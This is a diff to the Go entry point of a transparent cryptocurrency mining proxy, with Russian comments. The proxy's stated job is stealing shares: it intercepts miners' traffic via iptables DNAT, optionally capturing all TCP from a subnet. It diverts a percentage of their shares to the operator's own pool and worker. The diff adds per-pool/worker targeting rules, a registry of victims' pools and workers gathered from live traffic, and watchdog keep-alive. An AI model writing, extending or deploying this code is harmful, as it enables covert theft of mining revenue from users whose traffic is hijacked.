@@ -49,6 +49,17 @@ func main() {
 	// --- 3. Создание "stealer" (ядро логики кражи шар) ---
 	// ShareStealer решает для каждой шары: перенаправлять её или нет.
 	// Внутри него хранится статистика и персистентное соединение с целевым пулом.
+	// Правила (этап 4) — allowlist пар (пул, воркер); пусто = кусать у всех.
+	rules := make([]proxy.StealRule, 0, len(cfg.StealRules))
+	for _, r := range cfg.StealRules {
+		rules = append(rules, proxy.StealRule{Pool: r.Pool, Worker: r.Worker})
+	}
+	stealRules := proxy.NewStealRules(rules)
+	if stealRules.Len() > 0 {
+		log.Printf("[MAIN] steal rules: %d (allowlist; остальное сквозняком)", stealRules.Len())
+	} else {
+		log.Printf("[MAIN] steal rules: не заданы — кусаем у всех (legacy)")
+	}
 	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
 		Percentage:    cfg.Percentage,     // доля шар, которые кусаем
 		IntervalMin:   cfg.IntervalMin(),  // минимальная пауза между циклами
@@ -60,22 +71,35 @@ func main() {
 		TargetSSL:     cfg.StealTo.SSL,    // TLS к целевому пулу?
 		TargetTimeout: time.Duration(cfg.TargetTimeoutSec) * time.Second,
 		PauseShares:   cfg.PauseShares, // «пауза в шарах» — точный %
+		Rules:         stealRules,      // allowlist (пул+воркер), этап 4
 	})
 
+	// --- 3a. Heartbeat живости прокси ---
+	// Обновляется сервером (accept-цикл + фоновый тикер). Монитор /health
+	// отвечает 503, если heartbeat «протух» — на это реагирует watchdog
+	// (fail-open). Создаём ДО монитора, чтобы он успел получить ссылку.
+	hb := proxy.NewHeartbeat()
+
+	// --- 3b. Реестр «база» пул+воркер (этап 3) ---
+	// Наполняется из живого трафика (authorize/submit). Виден в /status.
+	// На его основе в дальнейшем будут применяться правила кражи (этап 4).
+	disc := proxy.NewDiscovery()
+
 	// --- 4. HTTP-мониторинг ---
-	// Эндпоинты /status (JSON-статистика) и /health (healthcheck).
+	// Эндпоинты /status (JSON-статистика + реестр) и /health (healthcheck).
 	// По умолчанию слушает только 127.0.0.1, наружу не отдаётся.
 	if cfg.MonitorAddr != "" {
-		monitor.StartServer(cfg.MonitorAddr, stealer, cfg.StealTo.Pool, cfg.StealTo.Worker)
+		monitor.StartServer(cfg.MonitorAddr, stealer, hb, disc, cfg.StealTo.Pool, cfg.StealTo.Worker)
 	}
 
 	// --- 5. Настройка iptables (NAT/DNAT) ---
 	// Если включено (нужен root): создаём цепочку MINING_PROXY, направляем
-	// трафик разрешённых подсетей, идущий на порт пула, в наш прокси.
+	// трафик разрешённых подсетей в наш прокси. capture_all_tcp=true —
+	// перенаправляем весь TCP подсети (воронка), иначе только порт пула.
 	// Cleanup вызывается через defer — правила будут убраны при остановке.
 	if cfg.SetupIPTables {
-		log.Printf("[MAIN] setting up iptables...")
-		if err := iptables.Setup(cfg.AllowedSubnets, cfg.ListenAddr, cfg.UpstreamPort); err != nil {
+		log.Printf("[MAIN] setting up iptables... (capture_all_tcp=%v)", cfg.CaptureAllTCP)
+		if err := iptables.Setup(cfg.AllowedSubnets, cfg.ListenAddr, cfg.UpstreamPort, cfg.CaptureAllTCP); err != nil {
 			log.Fatalf("[FATAL] iptables setup: %v", err)
 		}
 		defer iptables.Cleanup()
@@ -83,8 +107,19 @@ func main() {
 
 	// --- 6. Запуск TCP-прокси ---
 	// Листеним на listen_addr, каждое соединение обрабатываем в отдельной
-	// goroutine. Run() работает в фоне, а main ждёт сигнала завершения.
-	srv := proxy.NewServer(cfg.ListenAddr, cfg.UpstreamPool, cfg.UpstreamSSL, stealer)
+	// goroutine. transparent=true (по умолчанию): реальный адресат берётся
+	// из iptables DNAT (SO_ORIGINAL_DST), так что разные клиенты с разными
+	// пулами обслуживаются из одного прокси.
+	srv := proxy.NewServer(cfg.ListenAddr, cfg.UpstreamPool, cfg.UpstreamSSL, cfg.TransparentOn(), stealer, disc, hb)
+
+	// --- 6a. systemd sd_notify (WatchdogSec) ---
+	// Если процесс запущен под systemd (NOTIFY_SOCKET есть) — сообщаем
+	// "READY=1" и периодически "WATCHDOG=1", чтобы WatchdogSec не убивал
+	// живой прокси. Вне systemd вызовы — no-op.
+	if err := notifySystemd("READY=1"); err != nil {
+		log.Printf("[MAIN] sd_notify READY: %v", err)
+	}
+	go sdNotifyLoop()
 	go func() {
 		if err := srv.Run(); err != nil {
 			log.Fatalf("[FATAL] server: %v", err)
